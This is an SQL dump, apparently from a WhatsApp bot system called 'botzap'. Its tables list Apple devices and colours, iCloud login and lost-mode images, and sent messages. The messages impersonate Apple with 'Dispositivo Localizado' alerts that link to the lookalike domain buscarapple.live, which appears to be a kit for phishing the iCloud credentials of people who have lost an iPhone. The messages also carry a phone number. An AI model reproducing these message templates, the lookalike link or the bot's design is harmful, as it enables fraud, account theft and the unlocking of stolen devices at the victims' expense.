-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: 127.0.0.1
-- Tempo de geração: 12/03/2026 às 06:15
-- Versão do servidor: 10.4.32-MariaDB
-- Versão do PHP: 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Banco de dados: `botzap`
--

-- --------------------------------------------------------

--
-- Estrutura para tabela `capacidades`
--

CREATE TABLE `capacidades` (
  `id` int(11) NOT NULL,
  `nome` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Despejando dados para a tabela `capacidades`
--

INSERT INTO `capacidades` (`id`, `nome`) VALUES
(9, '1 TB'),
(6, '128 GB'),
(3, '16 GB'),
(10, '2 TB'),
(7, '256 GB'),
(4, '32 GB'),
(1, '4 GB'),
(11, '4 TB'),
(8, '512 GB'),
(5, '64 GB'),
(2, '8 GB'),
(12, '8 TB');

-- --------------------------------------------------------

--
-- Estrutura para tabela `cores`
--

CREATE TABLE `cores` (
  `id` int(11) NOT NULL,
  `nome` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `cores`
--

INSERT INTO `cores` (`id`, `nome`) VALUES
(1, 'Preto'),
(2, 'Branco'),
(3, 'Prata'),
(4, 'Cinza Espacial'),
(5, 'Ouro'),
(6, 'Ouro Rosa'),
(7, 'Preto Brilhante'),
(8, 'Vermelho (Product RED)'),
(9, 'Azul'),
(10, 'Amarelo'),
(11, 'Coral'),
(12, 'Verde'),
(13, 'Roxo'),
(14, 'Verde Meia-Noite'),
(15, 'Grafite'),
(16, 'Azul Pacífico'),
(17, 'Estelar'),
(18, 'Meia-Noite'),
(19, 'Azul Sierra'),
(20, 'Verde Alpino'),
(21, 'Preto Espacial'),
(22, 'Roxo Profundo'),
(23, 'Titânio Natural'),
(24, 'Titânio Azul'),
(25, 'Titânio Branco'),
(26, 'Titânio Preto'),
(27, 'Titânio Deserto'),
(28, 'Rosa'),
(29, 'Teal'),
(30, 'Ultramarine'),
(31, 'Preto'),
(32, 'Branco'),
(33, 'Azul Sierra'),
(34, 'Grafite'),
(35, 'Ouro');

-- --------------------------------------------------------

--
-- Estrutura para tabela `imagens_salvas`
--

CREATE TABLE `imagens_salvas` (
  `id` int(11) NOT NULL,
  `caminho` varchar(255) NOT NULL,
  `criado_em` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `imagens_salvas`
--

INSERT INTO `imagens_salvas` (`id`, `caminho`, `criado_em`) VALUES
(13, 'uploads/Colorido.png', '2026-02-27 20:52:01'),
(14, 'uploads/Dynamic.png', '2026-02-27 20:52:01'),
(15, 'uploads/LoginiCloud.png', '2026-02-27 20:52:01'),
(16, 'uploads/Mod.lost.ING.png', '2026-02-27 20:52:01'),
(17, 'uploads/ModoPerdidoPT.png', '2026-02-27 20:52:01'),
(18, 'uploads/SemDynamic.png', '2026-02-27 20:52:01'),
(19, 'uploads/iCloud.png', '2026-02-27 20:52:01');

-- --------------------------------------------------------

--
-- Estrutura para tabela `mensagens_enviadas`
--

CREATE TABLE `mensagens_enviadas` (
  `id` int(11) NOT NULL,
  `numero` varchar(20) NOT NULL,
  `modelo` varchar(100) NOT NULL,
  `capacidade` varchar(50) DEFAULT NULL,
  `cor` varchar(50) NOT NULL,
  `tipo_imagem` enum('url','local') NOT NULL,
  `caminho_link` varchar(255) NOT NULL,
  `link_rastreio` varchar(255) DEFAULT NULL,
  `texto_final` text NOT NULL,
  `data_hora` timestamp NOT NULL DEFAULT current_timestamp(),
  `status` varchar(20) DEFAULT 'ativo'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `mensagens_enviadas`
--

INSERT INTO `mensagens_enviadas` (`id`, `numero`, `modelo`, `capacidade`, `cor`, `tipo_imagem`, `caminho_link`, `link_rastreio`, `texto_final`, `data_hora`, `status`) VALUES
(80, '+554195457772', 'iPhone 12', '256 GB', 'Vermelho (Product RED)', 'local', 'uploads/Dynamic.png', 'https://buscarapple.live/kswij/', '*Dispositivo Localizado*\r\n> Dispositivo: *iPhone 12 Vermelho (Product RED) 256 GB*\r\n> Número de emergencia: *(+554195457772)*\r\n> ID de caso: *000-A946*\r\nPara iniciar o processo de recuperação, digite *Ajuda*\r\n> *Copyright ©️ 2025 Apple Inc*\r\n> | Apple ID | Support | Privacy Policy', '2026-03-11 20:35:36', 'ativo'),
(81, '+554195457772', 'iPad Air', '128 GB', 'Rosa', 'local', 'uploads/Dynamic.png', 'https://buscarapple.live/kswij/', '*Dispositivo Localizado*\r\n> Dispositivo: *iPad Air Rosa 128 GB*\r\n> Número de emergencia: *(+554195457772)*\r\n> ID de caso: *000-A946*\r\nPara iniciar o processo de recuperação, digite *Ajuda*\r\n> *Copyright ©️ 2025 Apple Inc*\r\n> | Apple ID | Support | Privacy Policy', '2026-03-11 21:04:21', 'ativo'),
(82, '+554195457772', 'iPhone 12', '128 GB', 'Vermelho (Product RED)', 'local', 'uploads/Dynamic.png', 'https://buscarapple.live/kswij/', '*Dispositivo Localizado*\r\n> Dispositivo: *iPhone 12 Vermelho (Product RED) 128 GB*\r\n> Número de emergencia: *(+554195457772)*\r\n> ID de caso: *000-A946*\r\nPara iniciar o processo de recuperação, digite *Ajuda*\r\n> *Copyright ©️ 2025 Apple Inc*\r\n> | Apple ID | Support | Privacy Policy', '2026-03-12 05:14:25', 'ativo');

-- --------------------------------------------------------

--
-- Estrutura para tabela `modelos`
--

CREATE TABLE `modelos` (
  `id` int(11) NOT NULL,
  `nome` varchar(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `modelos`
--

INSERT INTO `modelos` (`id`, `nome`) VALUES
(1, 'iPhone (original)'),
(2, 'iPhone 3G'),
(3, 'iPhone 3GS'),
(4, 'iPhone 4'),
(5, 'iPhone 4S'),
(6, 'iPhone 5'),
(7, 'iPhone 5C'),
(8, 'iPhone 5S'),
(9, 'iPhone SE (1ª Geração)'),
(10, 'iPhone 6'),
(11, 'iPhone 6 Plus'),
(12, 'iPhone 6s'),
(13, 'iPhone 6s Plus'),
(14, 'iPhone 7'),
(15, 'iPhone 7 Plus'),
(16, 'iPhone 8'),
(17, 'iPhone 8 Plus'),
(18, 'iPhone X'),
(19, 'iPhone XR'),
(20, 'iPhone XS'),
(21, 'iPhone XS Max'),
(22, 'iPhone 11'),
(23, 'iPhone 11 Pro'),
(24, 'iPhone 11 Pro Max'),
(25, 'iPhone SE (2ª Geração)'),
(26, 'iPhone 12'),
(27, 'iPhone 12 mini'),
(28, 'iPhone 12 Pro'),
(29, 'iPhone 12 Pro Max'),
(30, 'iPhone 13'),
(31, 'iPhone 13 mini'),
(32, 'iPhone 13 Pro'),
(33, 'iPhone 13 Pro Max'),
(34, 'iPhone 14'),
(35, 'iPhone 14 Plus'),
(36, 'iPhone 14 Pro'),
(37, 'iPhone 14 Pro Max'),
(38, 'iPhone 15'),
(39, 'iPhone 15 Plus'),
(40, 'iPhone 15 Pro'),
(41, 'iPhone 15 Pro Max'),
(42, 'iPhone 16'),
(43, 'iPhone 16 Plus'),
(44, 'iPhone 16 Pro'),
(45, 'iPhone 16 Pro Max'),
(46, 'iPhone 17'),
(47, 'iPhone 17 Pro'),
(48, 'iPhone 17 Pro Max'),
(49, 'iPad (básico)'),
(50, 'iPad mini'),
(51, 'iPad Air'),
(52, 'iPad Pro 11\"'),
(53, 'iPad Pro 12.9\"'),
(54, 'MacBook (12\")'),
(55, 'MacBook Air'),
(56, 'MacBook Pro 13\"'),
(57, 'MacBook Pro 14\"'),
(58, 'MacBook Pro 16\"'),
(59, 'Apple TV HD'),
(60, 'Apple TV 4K'),
(61, 'Apple TV 4K (2ª Ger ou novo)'),
(62, 'iPhone 13 Pro Max'),
(63, 'iPhone 12'),
(64, 'Samsung S23 Ultra'),
(65, 'Xiaomi 13 Pro');

-- --------------------------------------------------------

--
-- Estrutura para tabela `usuarios`
--

CREATE TABLE `usuarios` (
  `id` int(11) NOT NULL,
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Despejando dados para a tabela `usuarios`
--

INSERT INTO `usuarios` (`id`, `username`, `password`, `created_at`) VALUES
(1, 'Admin', '', '2026-03-12 06:22:00');

--
-- Índices para tabelas despejadas
--

--
-- Índices de tabela `capacidades`
--
ALTER TABLE `capacidades`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `nome` (`nome`);

--
-- Índices de tabela `cores`
--
ALTER TABLE `cores`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `imagens_salvas`
--
ALTER TABLE `imagens_salvas`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `mensagens_enviadas`
--
ALTER TABLE `mensagens_enviadas`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `modelos`
--
ALTER TABLE `modelos`
  ADD PRIMARY KEY (`id`);

--
-- Índices de tabela `usuarios`
--
ALTER TABLE `usuarios`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `username` (`username`);

--
-- AUTO_INCREMENT para tabelas despejadas
--

--
-- AUTO_INCREMENT de tabela `capacidades`
--
ALTER TABLE `capacidades`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT de tabela `cores`
--
ALTER TABLE `cores`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=36;

--
-- AUTO_INCREMENT de tabela `imagens_salvas`
--
ALTER TABLE `imagens_salvas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=20;

--
-- AUTO_INCREMENT de tabela `mensagens_enviadas`
--
ALTER TABLE `mensagens_enviadas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=83;

--
-- AUTO_INCREMENT de tabela `modelos`
--
ALTER TABLE `modelos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=66;

--
-- AUTO_INCREMENT de tabela `usuarios`
--
ALTER TABLE `usuarios`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
